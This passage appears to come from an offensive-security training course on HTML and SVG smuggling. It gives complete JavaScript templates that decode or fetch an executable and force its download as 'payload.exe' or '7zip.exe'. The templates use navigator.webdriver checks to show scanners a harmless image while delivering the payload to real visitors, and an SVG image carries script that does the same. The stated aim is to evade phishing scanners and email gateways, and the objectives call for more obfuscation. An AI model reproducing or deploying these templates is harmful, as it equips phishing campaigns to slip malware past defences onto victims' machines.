            const b64Image = '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';
            const binaryImage = atob(b64Image);
            const imageBytes = new Uint8Array(binaryImage.length);
            for (let i = 0; i < binaryImage.length; i++) {
              imageBytes[i] = binaryImage.charCodeAt(i);
            }
            const imgBlob = new Blob([imageBytes], { type: 'image/png' });
            const imgUrl = URL.createObjectURL(imgBlob);
            const imgElement = document.createElement('img');
            imgElement.src = imgUrl;
            document.body.appendChild(imgElement);
          } else {
            const b64Payload = '....'; // BASE64 PAYLOAD HERE
            const decodedPayload = atob(b64Payload);
            const decodedBytes = new Uint8Array(decodedPayload.length);
            for (let i = 0; i < decodedPayload.length; i++) {
              decodedBytes[i] = decodedPayload.charCodeAt(i);
            }
            const blob2 = new Blob([decodedBytes], { type: 'application/octet-stream' });
            const blobUrl2 = URL.createObjectURL(blob2);
            const link2 = document.createElement('a');
            link2.href = blobUrl2;
            link2.download = '7zip.exe';
            link2.click();
          }
        <\/script>
        </body>
        </html>
      `;

      const blob = new Blob([htmlContent], { type: 'text/html' });
      const blobUrl = URL.createObjectURL(blob);

      const link = document.createElement('a');
      link.href = blobUrl;
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
    </script>
  </body>
</html>

```
If the client matches our bot criteria, they are presented with an image. On the other hand, legitimate users will have a file smuggled and downloaded.
## Fetching Remote Blob
We'll improve the previous template by making analysis and detection more difficult by removing the statically embedded Base64 blobs from within the HTML smuggling template and instead remotely fetch them. Start by creating two files on the web server:
`image.png` - Contains the Base64 blob of the benign image.

- `payload.exe` - The payload in its original binary format.

Next, we'll fetch the contents of both files. For the image, no processing is needed since it's already in Base64 format. For `payload.exe`, after fetching its binary content, we'll convert it to Base64 so it can be embedded into the HTML smuggling template. This conversion uses a `FileReader` to read the binary data as a data URL, from which we extract the Base64-encoded portion.

```
<html>
  <body>
    <script>
      Promise.all([
        fetch('image.png')
          .then(res => res.text()),

        fetch('payload.exe')
          .then(res => res.blob())
          .then(blob => new Promise(resolve => {
            const reader = new FileReader();
            reader.onload = () => {
              const base64 = reader.result.split(',')[1];
              resolve(base64);
            };
            reader.readAsDataURL(blob);
          }))
      ]).then(([b64Image, b64Payload]) => {

        const htmlContent = `
          <html>
            <body>
              <script>
		          if (navigator.webdriver) {
                  // Display base64 image
		          const b64Image = ${JSON.stringify(b64Image)};
                  const binaryImage = atob(b64Image);
                  const imageBytes = new Uint8Array(binaryImage.length);
                  for (let i = 0; i < binaryImage.length; i++) {
                    imageBytes[i] = binaryImage.charCodeAt(i);
                  }
                  const imgBlob = new Blob([imageBytes], { type: 'image/png' });
                  const imgUrl = URL.createObjectURL(imgBlob);
                  const imgElement = document.createElement('img');
                  imgElement.src = imgUrl;
                  document.body.appendChild(imgElement);
                }
                else {
		          const b64Payload = ${JSON.stringify(b64Payload)};
                  const decodedPayload = atob(b64Payload);
                  const decodedBytes = new Uint8Array(decodedPayload.length);
                  for (let i = 0; i < decodedPayload.length; i++) {

                    decodedBytes[i] = decodedPayload.charCodeAt(i);
                  }
                  const blob = new Blob([decodedBytes], { type: 'application/octet-stream' });
                  const blobUrl = URL.createObjectURL(blob);
                  const link = document.createElement('a');
                  link.href = blobUrl;
                  link.download = 'payload.exe';
                  link.click();
                }
              <\/script>
            </body>
          </html>
        `;

        // Create and trigger a downloadable HTML blob
        const blob = new Blob([htmlContent], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = blobUrl;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
      });
    </script>
  </body>
</html>

```
In the first image, we use `curl` to analyze the static contents of the website. Notice how there are no Base64 blobs in the static code of our website.

Only when we access the website via the browser do we see the Base64 blobs being dynamically inserted.

One flaw in the previous HTML smuggling template was that `payload.exe` was being fetched and embedded even when the client matched our bot detection criteria. In the improved version below, we always fetch the image (`image.png`), but `payload.exe` is only fetched if the client is not identified as a bot.

```
<html>
  <body>
    <script>
      const isBot = navigator.webdriver // add additional bot tests here
      const promises = [
        fetch('image.png').then(res => res.text())
      ];
      if (isBot) {
        promises.push(Promise.resolve(null));
      } else {
        promises.push(
          fetch('payload.exe')
            .then(res => res.blob())
            .then(blob => new Promise(resolve => {
              const reader = new FileReader();
              reader.onload = () => resolve(reader.result.split(',')[1]);
              reader.readAsDataURL(blob);
            }))
        );
      }
      Promise.all(promises).then(([b64Image, b64Payload]) => {
        const htmlContent = `
          <html>
            <body>
              <script>
                const isBot = ${isBot};
                if (isBot) {
                  const b64Image = ${JSON.stringify(b64Image)};
                  const binaryImage = atob(b64Image);
                  const imageBytes = new Uint8Array(binaryImage.length);
                  for (let i = 0; i < binaryImage.length; i++) {
                    imageBytes[i] = binaryImage.charCodeAt(i);
                  }
                  const imgBlob = new Blob([imageBytes], { type: 'image/png' });
                  const imgUrl = URL.createObjectURL(imgBlob);
                  const imgElement = document.createElement('img');
                  imgElement.src = imgUrl;
                  document.body.appendChild(imgElement);
                } else {
                  const b64Payload = ${JSON.stringify(b64Payload)};
                  const decodedPayload = atob(b64Payload);
                  const decodedBytes = new Uint8Array(decodedPayload.length);
                  for (let i = 0; i < decodedPayload.length; i++) {
                    decodedBytes[i] = decodedPayload.charCodeAt(i);
                  }
                  const blob = new Blob([decodedBytes], { type: 'application/octet-stream' });
                  const blobUrl = URL.createObjectURL(blob);
                  const link = document.createElement('a');
                  link.href = blobUrl;
                  link.download = 'payload.exe';
                  link.click();
                }
              <\/script>
            </body>
          </html>
        `;
        const blob = new Blob([htmlContent], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = blobUrl;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
      });
    </script>
  </body>
</html>

```
In the image below, the `b64Payload` variable is set to `null` since the client was detected as a bot.

## Conclusion
As we've seen in previous modules, the original HTML smuggling template is easily detectable and phishing security scanners have detection rules for HTML smuggling. Implementing anti-bot measures into HTML smuggling templates can help prevent bots from flagging the website as a malicious website. Additionally, anti-bot measures can be added prior to any Blob creation and inside generated Blobs, as we've seen in this module.

## Objectives
Embed anti-bot measures into the blob and obfuscate the JavaScript code

Require user interaction prior to the smuggling of the payload

Create two HTML documents landing.html and smuggle.html. Perform anti-bot measures on the landing page, if the client is legitimate redirect them to smuggle.html and perform HTML smuggling


---

# Novo Módulo 7 — SVG Smuggling

Novo Módulo 7 — SVG Smuggling

- # Novo Módulo 7 — SVG Smuggling

# Disclaimer
# Module 7 - SVG Smuggling

## Introduction
SVG smuggling is a technique for delivering payloads that functions similarly to HTML smuggling but uses Scalable Vector Graphics (SVG) files as the carrier. Unlike other image formats such as PNG, JPG, or JPEG, SVG files are XML-based and can embed and execute JavaScript, making them suitable for delivering payloads. Below is a sample SVG canvas taken from SVGRepo:
```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
>
  <defs>
    <style>
      .b{ 
        fill: #000000;
      }
      .c {
        fill: none;
        stroke: #000000;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```
Saving the SVG above to a file and opening it in a browser displays a clipboard graphic.
## SVG File Delivery
One of the reasons SVG is seeing a rise in popularity is because it often isn't a restricted file type on email gateways and may initially appear as a benign image. However, SVGs can embed scripts or interactive elements, making them an effective initial vector for delivering subsequent payloads. In the diagram below, we illustrate four scenarios demonstrating how SVG files can be used to facilitate payload delivery. Although the scenarios are similar, they demonstrate how SVGs can play different roles at various stages of an attack chain.
In scenario 1 an email contains a link to an SVG file that smuggles an HTML file which delivers the payload.

- In scenario 2 an email contains a link to an HTML file that smuggles an SVG file which delivers the payload.

- In scenario 3 an email contains an SVG attachment that smuggles an HTML file which delivers the payload.

- In scenario 4 an email contains an HTML attachment that smuggles an SVG file which delivers the payload.

## Executing JavaScript Via Script Tags
After reviewing the format of a typical SVG file, we can begin injecting JavaScript into the SVG through various methods. The first method works by adding a `CDATA` section inside a `<script>` tag and embedding that into the SVG, as shown below.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
>
  <!-- Script -->
  <script type="text/javascript">
        <![CDATA[
            alert('Executing JavaScript!');
        ]]>
  </script>

  <defs>
    <style>
      .b{ 
        fill: #000000;
      }
      .c {
        fill: none;
        stroke: #000000;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```
Save the above code snippet as a `.svg` file and open it with a browser such as Chrome to execute the embedded JavaScript.

### Smuggling With Script Tags
We previously saw how we can embed and execute JavaScript within the SVG canvas file. In the code snippet below, we embed the HTML smuggling template we used in the Analyzing & Evading SmuggleShield module to smuggle the payload. Note that the smuggling template was slightly modified in order to work while being embedded inside an SVG, specifically the following changes were made:

- `document.createElement('a')` was changed to `document.createElementNS('http://www.w3.org/1999/xhtml', 'a')` so that the created element is treated as a valid HTML element in an SVG context.

- `document.body.appendChild(anchor)` was changed to `document.documentElement.appendChild(anchor)`. This is required because `document.body` is undefined in standalone SVGs.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
>
  <!-- Script -->
  <script type="text/javascript">
  <![CDATA[
    // Custom base64 decoder function
    function decodeBase64(base64Payload) {
      const base64 = base64Payload.replace(/[^A-Za-z0-9+/]/g, '');
      const output = [];
      const table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

      for (let i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
        const val = table.indexOf(base64.charAt(i));
        if (val === -1) continue;

        buffer = (buffer << 6) | val;
        bits += 6;

        if (bits >= 8) {
          bits -= 8;
          output.push((buffer >> bits) & 0xff);
        }
      }

      const length = output.length;
      const arrType = Uint8Array;
      const array = new arrType(length);
      for (let j = 0; j < length; j++) {
        array[j] = output[j];
      }

      return array;
    }

    function triggerDownload(data, filename) {
      const blobData = new Blob([data], { type: 'application/zip' });
      const makeURL = (self.URL || self.webkitURL).createObjectURL;
      const url = makeURL(blobData);

      const anchor = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
      anchor.href = url;
      anchor.download = filename;
      anchor.style.display = 'none';

      document.documentElement.appendChild(anchor);

      const evt = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true
      });
      anchor.dispatchEvent(evt);
    }

    const base64Payload = ''; // Base64-encoded binary file
    const fileName = 'payload.exe';

    const byteArray = decodeBase64(base64Payload);
    triggerDownload(byteArray, fileName);
  ]]>
</script>

  <defs>
    <style>
      .b{ 
        fill: #000000;
      }
      .c {
        fill: none;
        stroke: #000000;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```
Save the previous code snippet as a `.svg` file and open it in a browser to trigger the payload smuggling.

The video can be found in folder: `./videos/svg-1-demo.mov`

## Redirecting User After Download
